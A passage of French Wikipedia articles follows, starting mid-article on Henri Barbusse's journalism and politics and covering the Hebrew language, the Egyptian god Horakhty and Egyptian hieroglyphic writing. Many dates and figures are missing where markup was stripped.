La postérité se souviendra surtout du roman qu'il écrivit sur cette expérience "Le Feu", prix Goncourt , récit sur la Première Guerre mondiale dont le réalisme souleva les protestations du public de l'arrière autant que l'enthousiasme de ses camarades de combat. Il paraît sous forme de feuilleton dans le quotidien "L'Œuvre" à partir du , puis intégralement à la fin de aux éditions Flammarion. En , Barbusse fonde avec Raymond Lefebvre, Paul Vaillant-Couturier et l'ouvrier ajusteur Georges Bruyère l'Association républicaine des anciens combattants (ARAC).
Journalisme et militantisme politique.
En , il est appelé par Jean Longuet pour assurer la direction littéraire du journal "Le Populaire". Le premier article qu'il signe dans ce quotidien, qui est alors l'expression de la « minorité » pacifiste du Parti socialiste, est titré « Les lettres et le progrès ». Fondateur du mouvement pacifiste « Clarté » et de la revue homonyme (1919-1924), il adhère au Parti communiste, en 1923, et se lie d'amitié avec Lénine et Gorki, au cours de voyages qu'il effectue en URSS.
En , appelé par Marcel Cachin et Paul Vaillant-Couturier, qui ambitionnent de faire de "L'Humanité" un grand quotidien d'informations, il inaugure ses fonctions de directeur littéraire du journal communiste en dressant en « une » du journal la conception qu'il se fait de la littérature : rapprocher les intellectuels du peuple, susciter un art jeune tendu vers la libération des masses, effectuer une « critique rouge » de la littérature bourgeoise. Ce programme, il veut le mettre en pratique dans le projet qu'il porte d'une nouvelle revue. Il le réalise en 1928 en fondant la revue "Monde" (publiée jusqu'en 1935) avec des collaborations mondiales prestigieuses. La direction de cette revue est loin d'être un poste de tout repos : Barbusse doit se débattre entre les difficultés financières, les tournants politiques de l'Internationale communiste et du Parti communiste, et les fractures que ceux-ci occasionnent parmi les intellectuels français : débats sur la littérature prolétarienne, soumission ou non aux injonctions politiques, « affaire » Victor Serge, etc. Par l’entremise du poète hondurien Froylán Turcios, il entretient des relations avec Augusto Sandino qui dirigeait alors une guérilla contre l’occupation américaine du Nicaragua. Il écrit également dans "Le Progrès civique" autour de cette période.
Admirateur de la révolution d'Octobre ("Le Couteau entre les dents", 1921 ; "Voici ce qu'on a fait de la Géorgie", 1929), il cherche à définir une « littérature prolétarienne ». Il fut l'un des instigateurs du mouvement pacifiste Amsterdam-Pleyel, dont il devient le président avec Romain Rolland et auquel adhère notamment Albert Camus, dès la prise du pouvoir d'Hitler en Allemagne. Il fait plusieurs voyages en URSS et écrit une biographie élogieuse de Staline (1935). Il est également le porte-voix du PCF pour calomnier violemment contre Panaït Istrati, ancien proche de Barbusse, coupable d'avoir dénoncé le stalinisme au retour d'un voyage en URSS. Il reste, en dépit de son engagement partisan, soucieux de favoriser la confrontation des idées et publie, dans ses revues "Clarté" puis "Monde", des intellectuels de sensibilités non-communistes tout en refusant la demande de l’Internationale communiste de regrouper « les écrivains révolutionnaires » au niveau international.
Face à la menace du fascisme et de la guerre, il plaide pour l'alliance des sociaux-démocrates et des communistes. Le 14 juillet 1935, quelques semaines avant sa mort, il est au vélodrome Buffalo à Montrouge, pour prêter, dans l'union de toute la gauche et des centrales syndicales, le serment du « Rassemblement populaire », qui aboutira quelque temps plus tard au Front populaire.
C'est lors d'un de ces voyages qu'il meurt d'une pneumonie à Moscou, le . L'hypothèse selon laquelle il aurait été empoisonné sur ordre de Staline est controversée, tant la santé de Barbusse, chancelante dès avant la Première Guerre mondiale, avait été mise à l'épreuve par son intense activité nationale et internationale. Devenu une des figures emblématiques du Front populaire en France, acclamé par la foule qui avait envahi les rues de Paris lors du , ses funérailles à Paris, le , donnent l'occasion à la population parisienne de lui rendre un dernier hommage particulièrement important (500 000 personnes se sont rassemblées). Il est inhumé au cimetière du Père-Lachaise, non loin du mur des Fédérés, lieu symbolique de la mémoire populaire et ouvrière. C’est André Malraux qui, à la place de Jean-Richard Bloch, prononce son éloge au nom de l’Association des écrivains et artistes révolutionnaires.
Il a été marié à Hélyonne Mendès (1879-1955), fille de la compositrice Augusta Holmès et du poète Catulle Mendès.
Soutien de l'espéranto.
Barbusse n’était pas espérantiste, simplement sympathisant. En 1922 paraît la brochure de SAT "" (À bas le neutralisme), écrite par Eugène Lanti — le fondateur de SAT — pour justifier l’existence du mouvement espérantiste des travailleurs, séparé du mouvement neutre. Sur la page de titre de cette brochure se trouve la citation suivante de Barbusse : .
Barbusse fut également président d'honneur du premier congrès de SAT qui se tint à Prague en 1921.
Hommage.
Dès sa mort, de nombreuses municipalités baptisent de son nom des rues et des écoles, qui sont encore, au , des vecteurs de sa mémoire.
Un musée lui est consacré à Aumont-en-Halatte. Une avenue porte son nom dans sa commune de naissance, Asnières (devenue Asnières-sur-Seine). Une rue porte son nom à Paris dans le 5e arrondissement.
Le 11 novembre 2020, Maurice Genevoix, écrivain contemporain de Barbusse, comme lui ancien soldat et témoin littéraire de 1914-1918, entre au Panthéon. Henri Barbusse, autrefois plus célèbre, est lui considéré comme selon les mots de Jean-Yves Le Naour, notamment à cause de son engagement politique.

</doc>
<doc id="1462" url="https://fr.wikipedia.org/wiki?curid=1462" title="Hébreu">
Hébreu

L’hébreu (en hébreu moderne : / ou , et en hébreu ancien : « langue sacrée ») est une langue chamito-sémitique. Étroitement apparenté au phénicien, il appartient au groupe cananéen, de la branche centre-nord de la famille des langues sémitiques, qui contient aussi les langues araméennes.
L'hébreu ancien, ou classique, est la langue rituelle et liturgique de la religion juive, tandis que l'hébreu moderne compte plus de neuf millions de locuteurs en Israël et un million dans le reste du monde. L’hébreu est la langue officielle de l’État d’Israël.
Histoire.
Hébreu ancien.
L'écriture protosinaïtique, suivie de l’écriture protocananéenne, dérive probablement de l’écriture égyptienne en hiéroglyphes. Cette écriture évolue en écriture phénicienne, considérée comme la mère des écritures grecque, paléo-hébraïque, samaritaine et araméenne.
Proto-hébreu.
Les lettres d’Amarna ou de Tel-Amarna sont une correspondance diplomatique égyptienne du avant notre ère. Certaines lettres viennent de Canaan. Elles sont rédigées en akkadien, la langue diplomatique de l’époque. Elles comprennent bien des mots et des expressions de la ou des langues ouest-sémitiques parlées en Canaan. Il s'y trouve des parallèles linguistiques frappants avec l’hébreu de la Torah, ce qui indique que des formes dialectales de proto-hébreu étaient parlées en Canaan avant l'installation des Hébreux eux-mêmes (les lettres ne font pas mention des Hébreux, sauf peut-être sous la forme des "Apirou", population mal identifiée, dont le nom a un rapport possible avec « Hébreux »).
Au-delà de ces indices linguistiques, la forme de ce ou de ces proto-hébreux est imprécise. Les anciens dialectes phéniciens (Liban actuel) connus sont très similaires à l’hébreu ancien, à tel point qu’il est loisible de parler de formes géographiques d’une même langue, qui semble avoir été parlée (avec des variantes régionales) sur la côte syro-palestinienne. L’hébreu biblique provient donc d’une, voire de plusieurs de ces variantes géographiques dialectales.
En , l'ostracon de Khirbet Qeiyafa est découvert dans une strate datée entre 1050 et ; il pourrait être la plus ancienne trace écrite de l'hébreu sur le site de Khirbet Qeiyafa, une petite localité de l’âge du fer A.
Selon Israël Finkelstein, les premières variantes de caractères hébreux apparaissent entre -880 et -830.
Hébreu biblique.
L'hébreu est la langue de la Bible hébraïque ( / "tanakh") et de la Mishnah ; celle de la plupart des livres apocryphes ( / "sefarim hiśoniyim") est l'araméen. Les manuscrits de Qumran ( / "megilot genuzot") découverts dans des grottes situées au nord de la mer Morte entre 1947 et 1956, sont eux aussi principalement écrits en hébreu. En dehors des copies de livres bibliques, seulement un manuscrit sur six est rédigé en araméen (quelques manuscrits étant aussi composés en grec).
Dans la Bible, notamment dans le premier livre, la Genèse ( / "Berešit"), au , , on trouve / "Abram ha-’ibri", il s’agit « d’Abram l’Hébreu » avant qu’il ne devienne Abraham ( / "Abraham"), le texte ne fait aucune mention de la langue parlée par celui-ci et ses descendants. Il est généralement admis que le terme « hébreu » viendrait de l’expression « / "me-’eber la-nahar" » (de l’autre côté du fleuve), qui désigne l’origine d’Abraham.
Le texte de la Bible hébraïque en usage dans les éditions imprimées ou dans les rouleaux de la Torah à la synagogue est appelé texte « massorétique » ( / "massoret", signifiant « transmission »). Sa rédaction est le fruit d’un travail de plusieurs siècles, depuis l’époque des rois () jusqu'à celle des Maccabées (livre de Daniel, ), dont il est difficile d’établir les différentes étapes.
L'hébreu biblique est une langue religieuse, sans doute différente de la langue parlée par la population. Il comporte en effet essentiellement des termes utilisés dans un contexte religieux. Se constate ainsi une certaine pauvreté de la langue biblique : la Bible ne comporte pas plus de , dont seraient des hapax (des termes n'apparaissant qu'une seule fois), et ces mots sont construits sur seulement 500 racines hébraïques. À titre de comparaison, à la même époque, le lexique grec comporte . Un vocabulaire populaire plus diversifié a dû exister à côté de la langue formaliste et spécialisée de la Bible.
Hébreu mishnaïque.
Cette forme de l'hébreu correspond à une période de l'histoire de la langue hébraïque ( – ) qui correspond à peu près à la période du Talmud ( - ), et celui-ci en est donc un témoignage. Elle est appelée aussi hébreu rabbinique ou langue des Sages.
C'est une langue vivante utilisée dans la vie courante autant que dans la littérature, comme l'attestent des documents épigraphiques et des manuscrits retrouvés par les archéologues en Israël et réunis dans une banque de données israélienne. Elle commence à être étudiée par Abraham Geiger en 1845.
L’hébreu mishnaïque contient certaines innovations par rapport à l’hébreu de la Bible auquel il est postérieur de plusieurs siècles. Ces innovations portent en particulier sur les domaines de la syntaxe et du vocabulaire. Dans celui-ci, on constate des emprunts aux langues politiquement ou culturellement dominantes de l’époque : araméen, grec, latin et persan.
Hébreu médiéval.
À partir du , l’hébreu survit en dehors de la Palestine, au milieu des diverses communautés juives de la diaspora ( / "galout"), avant sa remarquable renaissance en Israël au à la suite des efforts d'Éliézer Ben-Yehoudah.
Dans la vie quotidienne, les Juifs parlent la langue du pays dans lequel ils vivent, réservant la langue hébraïque au domaine de l'étude et de la liturgie. C’est en effet dans cette langue que les Juifs de la diaspora prient trois fois par jour, qu’ils lisent la Torah et en étudient les commentaires. C’est également en hébreu que des sages ( / "hakhamim") des différents pays correspondent. La production hébraïque dans des domaines cultuels, culturels et professionnels montrent la dynamique de la langue hébraïque dans la longue durée historique.
Hébreu moderne : renaissance ou reconstruction de la langue.
L’hébreu connaît au une renaissance moderne sous l’impulsion d'Eliézer Ben Yehoudah (1858-1922).
Le travail de Ben Yehoudah trouve son origine dans la période dite de la "Haskalah" ().
La "Haskalah".
La "Haskalah" est un mouvement philosophique, influencé par le siècle des Lumières, qui est lancé à la fin du en Allemagne par Moses Mendelssohn (1729-1786). Il entend mieux intégrer les Juifs dans leur environnement non juif par la pratique d’une éducation « moderne », par l’implication dans les débats philosophiques ou scientifiques et par l’intégration aux circuits économiques de l’époque.
Une partie du mouvement s’attache à la renaissance de l’usage de la langue hébraïque. Celle-ci était devenue exclusivement une langue religieuse utilisée pour le culte. Les partisans de la "Haskalah", les "maskilim" (), du moins ceux intéressés par cette question, souhaitent développer l'usage laïc de la langue et en répandre l’usage dans les populations juives.
En 1793, le premier périodique en langue hébraïque est publié par des "maskilim" de la ville prussienne de Koenigsberg : / "Hameasef" (« le Collectionneur »). Une part importante du journal est consacrée aux traductions, à la philologie, à la création littéraire de type moderne et aux actualités.
Dès 1853, Avraham Mapou, le père du roman hébreu, publie un « roman biblique » qui connaîtra un grand succès auprès des lecteurs : "L’Amour de Sion".
Shalom Abramovitch, plus connu sous le nom de Mendele Moich Sforim (Mendele le vendeur de livres), invente, après un détour via le yiddish, une nouvelle prose hébraïque, mélange d’hébreu biblique et rabbinique.
La "Haskalah" se répand dans l'Empire austro-hongrois et dans l'Empire russe, où elle se heurte à l'hostilité de milieux traditionalistes, moins exposés à l’assimilation qu'en Allemagne.
C’est en Europe centrale et orientale que se développe la presse hébraïque : plusieurs journaux naissent à Vienne, en Galicie ( / "halouts", / "hašahar") ou dans l’Empire russe ( / "hamagid", / "hamelits"). Ils jouent un rôle clé dans la diffusion des idées « modernisatrices », des œuvres littéraires et de l’usage laïque de l’hébreu propre aux "maskilim".
Ces derniers sont très tôt confrontés à la relative pauvreté ( et ) de la langue hébraïque, en particulier pour évoquer le monde moderne. Le problème a deux origines. D’une part, l’hébreu est une langue datant de l’Antiquité, et d’autre part, il s’agit d’une langue formaliste spécialisée dans le domaine religieux et qui n’est quasiment plus usitée en dehors du domaine religieux.
Certains auteurs, comme Mendele Moich Sforim, commencent un travail de création lexicale, inventant de nouveaux mots sur la base de racines hébraïques et arabes.
Les "maskilim" parviennent ainsi à faire éclore l’usage littéraire de la langue hébraïque, partiellement modernisée.
Ben Yehouda.
Eliézer Perlman naît en 1858 dans une bourgade lituanienne. De son maître à la "yeshiva" (école talmudique), il apprend la grammaire hébraïque, et il lit en cachette, comme d’autres étudiants, le roman d’Avraham Mapou, "L’Amour de Sion". En effet, ce roman, considéré comme le premier roman moderne en hébreu, était associé au mouvement de la "Haskala" (les Lumières juives), qui prônait une ouverture à la modernité et une évolution culturelle du judaïsme s'opposant aussi à la stricte tradition des Yeshiva qui prône un hébreu uniquement biblique. Il poursuit des études de médecine à Paris où il a l’occasion de parler hébreu et conçoit le projet de faire revivre l’usage de cette langue. En 1880, il publie un article dans le mensuel juif viennois "Ha-Shahar" dans lequel il exhorte les Juifs à parler l’hébreu.
Sympathisant du premier groupe sioniste, les Amants de Sion, Eliézer Perlman choisit en 1881 le patronyme d’Eliézer Ben Yehouda et s’installe dans la ville de Jérusalem, en Palestine ottomane. Il ne s’adresse qu'en hébreu à Deborah qu'il a épousée la même année. Il interdit que l’on communique avec son fils, Ben Tsion, qui portera plus tard le nom d’Itamar Ben Avi, dans une autre langue (ce qui fera que son fils ne prononcera son premier mot qu'à quatre ans). Les "maskilim" ont développé une langue littéraire, mais c’est à l’initiative de Ben Yehouda que commence le renouveau de l’hébreu parlé.
En 1894, Ben Yehouda entreprend la rédaction d’un "Grand Dictionnaire de la langue hébraïque ancienne et moderne" réunissant tous les termes hébreux utilisables en hébreu moderne, dictionnaire intitulé à l'origine le "Thesaurus Totius Hebraitatis". Pour ce faire, il parcourut des dizaines de milliers d'ouvrages, se fonda sur l’hébreu religieux (biblique ou mishnaïque) et sur le travail de création lexical des premiers "maskilim". Ce travail restant insuffisant, Ben Yehouda est à l’origine de nombreux néologismes comme « restaurant » ( / "mis'ada"), « journal » ( / "iton") ou encore « montre » ( / "ša'on"). Il est aussi à la base de l’usage de la prononciation séfarade, qu’il considère être plus fidèle à la prononciation antique, de l’hébreu religieux comme base de la prononciation de l’hébreu moderne.
Après quinze années, le premier volume du "Thésaurus de la langue hébraïque ancienne et moderne" est publié. Les sixième et septième volumes sont publiés peu avant sa mort, en 1922. En 1959 la série complète en seize volumes est achevée par une équipe fidèle à son esprit. Pour chacune de ses entrées, ce Grand Dictionnaire contient une traduction en allemand, en russe, en français et en anglais, ainsi qu'une indication de la racine arabe correspondante.
La promotion de l'hébreu comme langue vernaculaire des Juifs se heurte à des oppositions, à la fois des orthodoxes opposés à un usage séculier d'une langue sacrée et des socialistes qui opposent le yiddish prolétaire à l'hébreu élitiste.
Oppositions et adhésions.
La pratique « vulgaire » et quotidienne de la « langue sacrée » ( / "Lĕšôn Ha-Qôdeš") suscite la très ferme hostilité des Juifs les plus religieux. Au cours du , la plupart des "haredim" (orthodoxes) se rallient cependant progressivement à la pratique quotidienne de cette langue « modernisée », tout en conservant l’hébreu biblique et michnaïque pour le culte.
Certains groupes "haredim" actuels, comme la "Edah Haredit" continuent de refuser l’usage laïc de l’hébreu, le réservant à un usage sacré. Les membres israéliens actuels de la "Edah" utilisent ainsi toujours le yiddish comme langue parlée.
À l’inverse, le mouvement sioniste défend rapidement l’usage de l’hébreu modernisé des "maskilim", plus particulièrement dans la version de Ben Yehouda.
Si dans , Theodor Herzl ne croit pas à l’hébreu comme langue uniforme de l’État juif, les organisations sionistes apparues entre la fin du et le début du s’y rallient très rapidement. L’hébreu devint ainsi une des langues officielles de la Palestine mandataire (1922-1948) et d’Israël depuis 1948.
Académie de la langue hébraïque.
La langue est officiellement régie par l'Académie de la langue hébraïque ( / "Ha-aqademia La-lašon Ha-ibhrit") née en 1948 et dont l'ancêtre créé en 1890 par Ben Yehouda, s'appelait la "Va'ad halashon", la « Commission de la langue hébraïque ». Cependant, les Israéliens ont tendance à ne pas suivre les conseils que donne l'Académie hébraïque ; par exemple, les recommandations en matière de prononciation de l'hébreu moderne ne sont pas toujours suivies, et on retient, par exemple, la prononciation des consonnes gutturales, qui donnent à l'hébreu son caractère oriental. Les Israéliens sont bien éloignés maintenant du modèle oriental initialement proposé. Une des décisions de l'Académie de la langue hébraïque qui a été appliquée est la prononciation du « "sadi" » comme le « z » allemand, en raison de la difficulté supposée des populations germanophones de le prononcer autrement, le « "sadi" » devient alors « "tsadi" ».
Synthèse.
Pendant le Moyen Âge, il n'est plus une langue vernaculaire il subsiste comme la langue des études juives (avec l'araméen du Talmud et les langues vernaculaires). Les textes sacrés et les discussions rabbiniques sont tous écrits en hébreu. Son utilisation est réservée à la liturgie juive (langue liturgique ou cultuelle) et au monde de la littérature rabbinique, la correspondance entre lettrés (langue savante) ou dans les documents commerciaux entre Juifs (langue véhiculaire). L'hébreu est la langue d'écriture principale des Juifs, principalement en matière halakhique : rédaction des protocoles des tribunaux, dossiers halakhiques, interprétation des Écritures, et plus encore.
Le linguiste Claude Hagège affirme que « l'hébreu n'était plus vivant, mais il n'était pas mort ». L'hébreu est la langue de l'étude juive, qui occupe une place centrale dans la vie des communautés juives jusqu'à nos jours.
À partir de la fin du , avec la croissance du mouvement éducatif juif en Allemagne et en Europe de l'Est, la langue hébraïque entre dans la dynamique moderne. Tout au long du siècle, son utilisation laïque se fait croissante.
Avec le mouvement sioniste à la fin du , l'hébreu est utilisé comme langue d'établissement en terre d'Israël. Eliezer Ben-Yehuda et d'autres linguistes l'adaptent et en font une langue vernaculaire, qui deviendra la langue nationale du Yishouv. Les "maskilim" qui l’ont précédée y ont contribué. Les locuteurs de l’hébreu qui lui ont succédé continuent de créer des mots. Durant cette renaissance de l'hébreu, il existe deux dialectes, juif et samaritain. Le dialecte juif a quatre modes de prononciation principaux (ashkénaze, sépharade, yéménite et irakienne). Ben-Yehuda choisit la prononciation espagnole comme prononciation standard de l'hébreu dans le Yishouv. La pratique de la vie linguistique est un compromis entre les prononciations.
Avec le mandat britannique, l'hébreu obtient le statut de langue officielle, aux côtés de l'arabe et de l'anglais.
L'hébreu est parlé par plus de neuf millions de locuteurs en 2008.
Alphabet.
Écriture des consonnes.
L’hébreu s’écrit et se lit de droite à gauche en utilisant un alphabet consonantique (abjad) de 22 lettres.
L'écriture actuelle de l’hébreu est l'écriture dite carrée ( / "ketab meruba’"), que les sages du Talmud appelaient « écriture assyrienne » ( / "ketab ašuri").
Les sages du Talmud connaissaient deux écritures de l’hébreu : l’écriture dite hébraïque ( / "ketab 'ibri" — maintenant appelée alphabet paléo-hébraïque) et l’écriture assyrienne. D’après un traité talmudique, le peuple d’Israël aurait abandonné aux Samaritains l’écriture hébraïque à l’époque du Talmud et conservé la seule écriture assyrienne : « Israël a choisi l’écriture assyrienne et la langue sacrée et a laissé aux "hediotot" [Samaritains] l’écriture hébraïque et la langue araméenne ».
Ainsi les caractères paléo-hébraïques de l’hébreu samaritain, qui sont encore utilisés par les Samaritains de la petite communauté de Holon et Naplouse, sont les caractères antiques, légèrement modifiés au cours des siècles et abandonnés par les Juifs à l’époque talmudique.
Si l’hébreu ancien distingue clairement les différentes gutturales, l’hébreu contemporain ne le fait guère. De plus, sa syntaxe tend de plus en plus vers des structures indo-européennes. La prononciation de l’hébreu moderne ne distingue plus certains phonèmes notés par des lettres différenciées, telles que « ח » ("het") et « כ » ("khaf") par exemple, ce qui cause une tendance homophonique et des difficultés d’orthographe. D’autres couples homophoniques figurent dans l’hébreu moderne : « ב » / « ו » ("vav" / "bhet"), « ת » / « ט » ("tet" / "tav") et « כ » / « ק » ("qof" / "kaf").
Notation des voyelles.
À l’origine, la langue hébraïque, comme toutes les autres langues sémitiques utilisant l’alphabet, ne note pas les sons vocaliques.
Trois systèmes vocaliques se sont développés : le babylonien, le palestinien et celui dit de Tibériade. Ce n’est qu’au que les sages ( / "hazal") du judaïsme réunis à Tibériade conviennent d’un système de voyelles basé sur des traits et des points qu’on appelle système vocalique, qui se nomme en hébreu « "torat haniqud" » (תורה הניקוד, « règles de ponctuation »). On hérite aussi de cette période les signes de cantillation ( / "te'amim" — le mot / "ta’am" signifie « goût » en hébreu), la Torah étant chantée depuis ses origines ; elle l’est encore dans le culte juif, grâce à ces "signes de cantillation".
Grammaire.
Formation des mots.
En hébreu, tout mot peut s’analyser en deux morphèmes : le schème et la racine.
Les schèmes nominaux ou verbaux constituent des squelettes dans lesquels sont coulées les racines. Ils sont en nombre limité et associés à des sens ou des usages spécifiques.
La racine de chaque mot se dégage naturellement pour le locuteur qui distingue l’ajout d’une consonne préfixale ou suffixale. Une racine est généralement trilitère, mais l’hébreu connaît aussi des racines quadrilitères.
C’est ainsi qu'on peut produire un adjectif, une conjugaison, une forme passive, un indicatif etc. à partir de toute racine, même si le mot est d’origine étrangère ou ["lazim"] , comme l’écrit Rachi : prenons le mot « téléphone » () se prononçant bien entendu « "telefon" », le verbe « téléphoner » suivant la grammaire hébraïque, se dit « "letalpen" » () (certains prononcent [letalfεn] par assimilation).
Les membres de la famille Kimhi qui ont vécu vers le milieu du Moyen Âge ont passé de nombreuses années à dénombrer et comprendre les schèmes () et ont posé les bases de la première grammaire hébraïque.

</doc>
<doc id="1463" url="https://fr.wikipedia.org/wiki?curid=1463" title="Harakhtes">
Harakhtes



</doc>
<doc id="1464" url="https://fr.wikipedia.org/wiki?curid=1464" title="Horakhty">
Horakhty

Horakhty ("L'Horus des deux horizons") est, dans la mythologie égyptienne, une des manifestations d'Horus représentée sous la forme d'un faucon. Il est le dieu du soleil se levant à l'horizon.
Selon la tradition égyptienne, Pharaon gouverne d'un horizon à l'autre (d'Est en Ouest) sous la forme d'Horakhty.
À Héliopolis, il est adoré aux côtés de Rê sous la forme de Rê-Horakhty.

</doc>
<doc id="1465" url="https://fr.wikipedia.org/wiki?curid=1465" title="Harachte">
Harachte



</doc>
<doc id="1466" url="https://fr.wikipedia.org/wiki?curid=1466" title="Écriture hiéroglyphique égyptienne">
Écriture hiéroglyphique égyptienne

L’écriture hiéroglyphique égyptienne est un système d'écriture figurative : les caractères qui la composent représentent des objets divers tels que des plantes, des figures de dieux, d'humains et d'animaux, regroupés en catégories. Les égyptologues y distinguent traditionnellement trois catégories de signes :
Apparue à la fin du avant notre ère en Haute-Égypte, l'écriture hiéroglyphique est utilisée jusqu’à l'époque romaine, soit pendant plus de trois mille ans. La connaissance des hiéroglyphes se perdit avec la fermeture des lieux de culte dits « païens » par l’empereur vers 380. Des Européens se sont aventurés dans des tentatives de traduction au début du (Johan David Åkerblad, Thomas Young) avec des succès inégaux, et il faudra, après la découverte de la pierre de Rosette, les travaux de Jean-François Champollion pour briser, après quatorze siècles, le « sceau mis sur les lèvres du désert ».
Étymologie.
Le mot "hiéroglyphe" dérive du grec , formé lui-même à partir de , « sacré », et , « graver ».
À l'époque gréco-romaine, il désignait « celui qui trace les hiéroglyphes » et non les hiéroglyphes eux-mêmes, qui se disaient , c'est-à-dire « les (caractères) sacrés gravés » sur les monuments (stèles, temples et tombeaux). Ultérieurement, par un glissement de sens, le mot "hiéroglyphes" finit par désigner les caractères hiéroglyphiques eux-mêmes.
Les Égyptiens eux-mêmes nommaient leur écriture « /ˌmaːtʼaw ˈnaːcaɾ/ » (« parole divine ») soit, en
Par extension, on qualifie souvent de "hiéroglyphique" une écriture utilisant le même principe logographique que l'égyptien. Ainsi, on parle du "hittite" ou du "maya" hiéroglyphiques. Il n'est cependant pas admis de dire des caractères chinois qu'ils sont des hiéroglyphes. Hiéroglyphes comme sinogrammes appartiennent à l’ensemble plus vaste des logogrammes.
Histoire et évolution.
L'écriture hiéroglyphique est attestée dès 3250-3200 . Elle est employée pendant plus de , la dernière inscription connue datant de .
Les premiers hiéroglyphes connus sont contemporains des premières tablettes cunéiformes mais sont complètement différents, tant par leur graphisme que par leur logique. Certains scientifiques émettent l'hypothèse qu'ils en dérivent ou qu'ils ont au moins été influencés par le système inventé en Mésopotamie mais ce n'est pas généralement admis. En 2014, James P. Allen écrit au contraire que l'écriture égyptienne « semble être apparue soudainement en 3250 avant notre ère, comme système complet » et que « bien qu'on ait pensé autrefois que l'idée de l’écriture fût arrivée en Égypte depuis la Mésopotamie, de récentes découvertes indiquent que l'écriture s’est développée de manière indépendante en Égypte ».
Les plus anciennes inscriptions connues (3250-3200 ), découvertes en 1986 dans la tombe U-j de la nécropole prédynastique d'Oumm el-Qa'ab (près d'Abydos, en Haute-Égypte), sont des tablettes cérémonielles. Il s'agit encore d'une proto-écriture mais avec des signes de forme codifiée (d'orientation et de dimensions calibrées), les tablettes servant sans doute à identifier des biens et en indiquer la valeur. Dès 3100 (dynastie « zéro ») les inscriptions comprennent de brefs groupes nominaux, mais pas encore de prédicats ni de longs textes d'un seul tenant. La première locution complète connue date d'environ 2690 (fin de la ) ; c'est un sceau-cylindre du pharaon Péribsen, sur lequel est écrit .
Dès l'Ancien Empire, l'égyptien hiéroglyphique est un système d’écriture où se mêlent idéogrammes, signes consonantiques (unilitères, bilitères, et même trilitères) et déterminatifs (voir plus bas). À partir de la , les scribes utilisent un certain nombre de bilitères comme syllabaires ("s"ȝ", b"ȝ", k"ȝ etc.) pour transcrire les noms sémitiques ou d’origine sémitique, mais l’écriture dite syllabique ne sortira jamais de ce domaine.
Quelle que soit leur fonction, les signes sont figuratifs : ils représentent quelque chose de tangible, souvent facilement reconnaissable, même pour quelqu'un qui ignore le sens du signe. En effet, les Égyptiens s'inspirent de leur environnement pour le dessin des hiéroglyphes : objets de la vie quotidienne, animaux, plantes, parties du corps. À l'époque de l'Ancien, du Moyen et du Nouvel Empire, il existe environ 700 signes hiéroglyphiques alors que, à l'époque gréco-romaine, on en dénombrait plus de 6000.
Les hiéroglyphes sont gravés sur pierre ou bien, dans le cas de l'écriture hiératique, tracés au calame et à l'encre sur un support moins durable.
Apparue avant la civilisation pharaonique, l'utilisation des hiéroglyphes gravés n'est donc pas liée aux nécessités administratives d'un État en formation. Elle se limite aux domaines dans lesquels l'esthétique ou la valeur magique des mots avaient de l'importance : formules d'offrandes et fresques funéraires, textes religieux, inscriptions officielles. L'écriture consiste d'abord en de courtes inscriptions désignant un souverain, une bataille, une quantité, puis, aux environs de 2700 avant notre ère, sous le règne du roi Djéser marqué par le développement des pratiques religieuses et des rites funéraires, s'élaborent des phrases construites que l'on retrouve essentiellement dans les pyramides.
La dernière inscription connue, datée de 394, se trouve dans le temple de Philæ.
Après le temps consacré au développement du système d'écriture de type hiéroglyphique, quatre autres stades d'évolution (et de simplification progressive) de cette écriture peuvent être distingués : après le stade hiéroglyphique vient le stade des hiéroglyphes linéaires ; puis vient celui de l'écriture hiératique ; vient ensuite celui de l'écriture démotique ; enfin, vient le copte, comme dernière étape du processus d'abstraction et de simplification.
Une première simplification du système d'écriture égyptien est qualifiée par les égyptologues de hiéroglyphes linéaires. Ceux-ci conservent l'aspect figuratif des hiéroglyphes gravés, mais sont tracés avec moins de précision que ces derniers ; ils constituent par ailleurs un premier pas vers l'abstraction de ce système de représentation. Ils sont peints sur les sarcophages en bois et les papyrus des « livres des morts ».
L'écriture hiératique, troisième stade de l'évolution du système d'écriture égyptien, en constitue la forme cursive. Réservée aux documents administratifs et aux documents privés, elle est tracée au pinceau et a pour supports les ostraca (tessons de poterie ou de calcaire), les tablettes de bois, ou plus rarement le papyrus et le parchemin, d'un coût très élevé.
À partir de l'époque saïte (), le hiératique est partiellement supplanté par une nouvelle cursive, le démotique. Il s'agit d'une simplification extrême de l'écriture hiératique, réservée aux actes administratifs et aux documents de la vie courante, d'où son nom d'écriture « populaire ». L'écriture hiératique n'est alors plus utilisée que pour consigner des textes religieux ou sacerdotaux, conjointement avec les hiéroglyphes, d'où son nom d'écriture « sacerdotale ». À l'époque ptolémaïque, le grec s'impose de plus en plus comme langue administrative : à partir de 146 avant notre ère les contrats écrits uniquement en démotique perdent toute valeur légale.
Le copte, enfin, est le dernier stade de la langue et de l'écriture égyptiennes. Il est encore utilisé de nos jours, mais uniquement comme langue liturgique. Il s'écrit au moyen de l'alphabet grec auquel on a ajouté sept caractères démotiques pour transcrire les sons étrangers au grec.
L'écriture égyptienne n'est plus utilisée actuellement pour écrire quelque langue moderne que ce soit. Cependant, selon certains chercheurs, c'est elle qui, via le protosinaïtique, aurait donné naissance à l'alphabet phénicien, lequel, à son tour, sera à l'origine des alphabets hébreu, araméen et grec, donc des caractères latins et cyrilliques.
Le système d'écriture.
Les hiéroglyphes gravés égyptiens sont tous, ou peu s'en faut, figuratifs : ils représentent des éléments réels ou imaginaires, parfois stylisés et simplifiés, mais parfaitement reconnaissables dans la plupart des cas.
Jean-François Champollion, le déchiffreur des hiéroglyphes, considéré comme le père de l'égyptologie, définit le système hiéroglyphique comme suit :
C'est un système complexe, une écriture tout à la fois figurative, symbolique et phonétique, dans un même texte, une même phrase, je dirais presque dans un même mot.
En effet, un même caractère peut, selon le contexte, être interprété de diverses manières : comme phonogramme (lecture phonétique), comme idéogramme ou comme déterminatif (lecture sémantique). Nous verrons plus loin que le déterminatif, qui ne se lit pas, facilite la lecture en « déterminant » le champ lexical auquel le mot appartient : ainsi, le déterminatif de l'« homme assis » (A1 d'après la classification de Gardiner) accompagne les mots désignant la fonction (« vizir », « prêtre »), la profession (« artisan »), l'ethnie (« Asiatique », « Égyptien », « Libyen », « Nubien ») ou encore les liens de parenté (« père », « fils », « frère »).
Dans les parties qui suivent, les hiéroglyphes seront translittérés, c'est-à-dire retranscrits à l'aide de symboles d'un autre système d'écriture.
Lecture phonétique.
